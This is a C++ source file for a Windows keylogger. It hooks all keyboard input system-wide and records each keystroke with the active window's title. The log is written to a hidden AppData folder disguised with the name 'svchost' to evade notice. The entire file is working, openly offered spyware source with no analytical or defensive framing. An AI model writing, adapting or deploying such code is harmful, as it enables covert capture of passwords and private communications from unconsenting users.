#include "keylogger.hpp"

#include <string>
#include <windows.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#include <tchar.h>

Keylogger& Keylogger::getInstance() {
	static Keylogger instance;
	return instance;
}

void Keylogger::registerKey(std::string key) {
	HWND currentWindowHWND = GetForegroundWindow();

	constexpr unsigned MAX_WINDOW_TITLE_SIZE = 255;

	char* currentWindowTitle = (char*)malloc(MAX_WINDOW_TITLE_SIZE);
	GetWindowTextA(currentWindowHWND, currentWindowTitle, MAX_WINDOW_TITLE_SIZE);
	DWORD bytesWritten;
	SetFilePointer(Keylogger::getInstance().logFile, 0, NULL, FILE_END);
	if (Keylogger::getInstance().lastWindowTitle == NULL || strcmp(Keylogger::getInstance().lastWindowTitle, currentWindowTitle) != 0) {
		WriteFile(Keylogger::getInstance().logFile, "\n", 1, &bytesWritten, NULL);
		WriteFile(Keylogger::getInstance().logFile, currentWindowTitle, strlen(currentWindowTitle), &bytesWritten, NULL);
		WriteFile(Keylogger::getInstance().logFile, "\n", 1, &bytesWritten, NULL);
		if (Keylogger::getInstance().lastWindowTitle != NULL)
			free(Keylogger::getInstance().lastWindowTitle);
		Keylogger::getInstance().lastWindowTitle = (char*)malloc(MAX_WINDOW_TITLE_SIZE);
		strncpy_s(Keylogger::getInstance().lastWindowTitle, MAX_WINDOW_TITLE_SIZE, currentWindowTitle, MAX_WINDOW_TITLE_SIZE);
	}
	WriteFile(Keylogger::getInstance().logFile, key.c_str(), strlen(key.c_str()), &bytesWritten, NULL);
	free(currentWindowTitle);
}

LRESULT CALLBACK Keylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	LRESULT result = CallNextHookEx(NULL, nCode, wParam, lParam);
	KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
	switch (wParam) {
	case WM_SYSKEYDOWN:
	case WM_KEYDOWN:
		registerKey(getKeyName(kbd->vkCode));
		break;
	case WM_SYSKEYUP:
	case WM_KEYUP:
		switch (kbd->vkCode) {
		case VK_SHIFT:
		case VK_LSHIFT:
		case VK_RSHIFT:
			registerKey("[SHIFT release]");
			break;
		default:
			break;
		}
		break;
	}
	return result;
}

Keylogger::Keylogger() {
	TCHAR logPath[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, logPath);
	PathAppend(logPath, _T("\\svchost"));

	CreateDirectory(logPath, NULL);
	SetFileAttributes(logPath, FILE_ATTRIBUTE_HIDDEN);

	PathAppend(logPath, _T("\\log"));
	logFile = CreateFile(logPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	initializeKeyNameMap();

	SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger::LowLevelKeyboardProc, 0, 0);
}

std::string Keylogger::getKeyName(DWORD vkCode) {
	auto key = Keylogger::getInstance().keyNameMap.find(vkCode);
	if (key == Keylogger::getInstance().keyNameMap.end()) {
		return "[Undefined]";
	}
	return key->second;
}

void Keylogger::initializeKeyNameMap() {
	keyNameMap = {
		{0x01, "[Left mouse]"},
		{0x02, "[Right mouse]"},
		{0x03, "[Control-break processing]"},
		{0x04, "[Middle mouse]"},
		{0x05, "[X1 mouse]"},
		{0x06, "[X2 mouse]"},
		{0x08, "[BACKSPACE]"},
		{0x09, "[TAB]"},
		{0x0C, "[CLEAR]"},
		{0x0D, "[ENTER]"},
		{0x10, "[SHIFT]"},
		{0x11, "[CTRL]"},
		{0x12, "[ALT]"},
		{0x13, "[PAUSE]"},
		{0x14, "[CAPS LOCK]"},
		{0x15, "[IME Kana mode]"},
		{0x15, "[IME Hanguel mode]"},
		{0x15, "[IME Hangul mode]"},
		{0x16, "[IME On]"},
		{0x17, "[IME Junja mode]"},
		{0x18, "[IME final mode]"},
		{0x19, "[IME Hanja mode]"},
		{0x19, "[IME Kanji mode]"},
		{0x1A, "[IME Off]"},
		{0x1B, "[ESC]"},
		{0x1C, "[IME convert]"},
		{0x1D, "[IME nonconvert]"},
		{0x1E, "[IME accept]"},
		{0x1F, "[IME mode change request]"},
		{0x20, "[SPACEBAR]"},
		{0x21, "[PAGE UP]"},
		{0x22, "[PAGE DOWN]"},
		{0x23, "[END]"},
		{0x24, "[HOME]"},
		{0x25, "[LEFT ARROW]"},
		{0x26, "[UP ARROW]"},
		{0x27, "[RIGHT ARROW]"},
		{0x28, "[DOWN ARROW]"},
		{0x29, "[SELECT]"},
		{0x2A, "[PRINT]"},
		{0x2B, "[EXECUTE]"},
		{0x2C, "[PRINT SCREEN]"},
		{0x2D, "[INS]"},
		{0x2E, "[DEL]"},
		{0x2F, "[HELP]"},
		{0x30, "0"},
		{0x31, "1"},
		{0x32, "2"},
		{0x33, "3"},
		{0x34, "4"},
		{0x35, "5"},
		{0x36, "6"},
		{0x37, "7"},
		{0x38, "8"},
		{0x39, "9"},
		{0x41, "A"},
		{0x42, "B"},
		{0x43, "C"},
		{0x44, "D"},
		{0x45, "E"},
		{0x46, "F"},
		{0x47, "G"},
		{0x48, "H"},
		{0x49, "I"},
		{0x4A, "J"},
		{0x4B, "K"},
		{0x4C, "L"},
		{0x4D, "M"},
		{0x4E, "N"},
		{0x4F, "O"},
		{0x50, "P"},
		{0x51, "Q"},
		{0x52, "R"},
		{0x53, "S"},
		{0x54, "T"},
		{0x55, "U"},
		{0x56, "V"},
		{0x57, "W"},
		{0x58, "X"},
		{0x59, "Y"},
		{0x5A, "Z"},
		{0x5B, "[Left Windows]"},
		{0x5C, "[Right Windows]"},
		{0x5D, "[Applications key]"},
		{0x5F, "[Computer Sleep]"},
		{0x60, "0"},
		{0x61, "1"},
		{0x62, "2"},
		{0x63, "3"},
		{0x64, "4"},
		{0x65, "5"},
		{0x66, "6"},
		{0x67, "7"},
		{0x68, "8"},
		{0x69, "9"},
		{0x6A, "[Multiply]"},
		{0x6B, "[Add]"},
		{0x6C, "[Separator]"},
		{0x6D, "[Subtract]"},
		{0x6E, "[Decimal]"},
		{0x6F, "[Divide]"},
		{0x70, "[F1]"},
		{0x71, "[F2]"},
		{0x72, "[F3]"},
		{0x73, "[F4]"},
		{0x74, "[F5]"},
		{0x75, "[F6]"},
		{0x76, "[F7]"},
		{0x77, "[F8]"},
		{0x78, "[F9]"},
		{0x79, "[F10]"},
		{0x7A, "[F11]"},
		{0x7B, "[F12]"},
		{0x7C, "[F13]"},
		{0x7D, "[F14]"},
		{0x7E, "[F15]"},
		{0x7F, "[F16]"},
		{0x80, "[F17]"},
		{0x81, "[F18]"},
		{0x82, "[F19]"},
		{0x83, "[F20]"},
		{0x84, "[F21]"},
		{0x85, "[F22]"},
		{0x86, "[F23]"},
		{0x87, "[F24]"},
		{0x90, "[NUM LOCK]"},
		{0x91, "[SCROLL LOCK]"},
		{0xA0, "[Left SHIFT]"},
		{0xA1, "[Right SHIFT]"},
		{0xA2, "[Left CONTROL]"},
		{0xA3, "[Right CONTROL]"},
		{0xA4, "[Left MENU]"},
		{0xA5, "[Right MENU]"},
		{0xA6, "[Browser Back]"},
		{0xA7, "[Browser Forward]"},
		{0xA8, "[Browser Refresh]"},
		{0xA9, "[Browser Stop]"},
		{0xAA, "[Browser Search]"},
		{0xAB, "[Browser Favorites]"},
		{0xAC, "[Browser Start and Home]"},
		{0xAD, "[Volume Mute]"},
		{0xAE, "[Volume Down]"},
		{0xAF, "[Volume Up]"},
		{0xB0, "[Next Track]"},
		{0xB1, "[Previous Track]"},
		{0xB2, "[Stop Media]"},
		{0xB3, "[Play/Pause Media]"},
		{0xB4, "[Start Mail]"},
		{0xB5, "[Select Media]"},
		{0xB6, "[Start Application 1]"},
		{0xB7, "[Start Application 2]"},
		{0xBA, "[Miscellaneous characters, '},:' key]"},
		{0xBB, "[+]"},
		{0xBC, "[,]"},
		{0xBD, "[-]"},
		{0xBE, "[.]"},
		{0xBF, "[Miscellaneous characters, '/?' key]"},
		{0xC0, "[Miscellaneous characters, '`~' key]"},
		{0xDB, "[Miscellaneous characters, '[{' key]"},
		{0xDC, "[Miscellaneous characters, '\\|' key]"},
		{0xDD, "[Miscellaneous characters, ']' key]"},
		{0xDE, "[Miscellaneous characters, 'single-quote/double-quote' key]"},
		{0xDF, "[Miscellaneous characters]"},
		{0xE1, "[OEM specific]"},
		{0xE2, "[Either the angle bracket key or the backslash key on the RT 102-key keyboard]"},
		{0xE5, "[IME PROCESS key]"},
		{0xE6, "[OEM specific]"},
		{0xE7, "[Used to pass Unicode characters as if they were keystrokes]"},
		{0xF6, "[Attn]"},
		{0xF7, "[CrSel]"},
		{0xF8, "[ExSel]"},
		{0xF9, "[Erase EOF]"},
		{0xFA, "[Play]"},
		{0xFB, "[Zoom]"},
		{0xFD, "[PA1]"},
		{0xFE, "[Clear]"}
	};
}
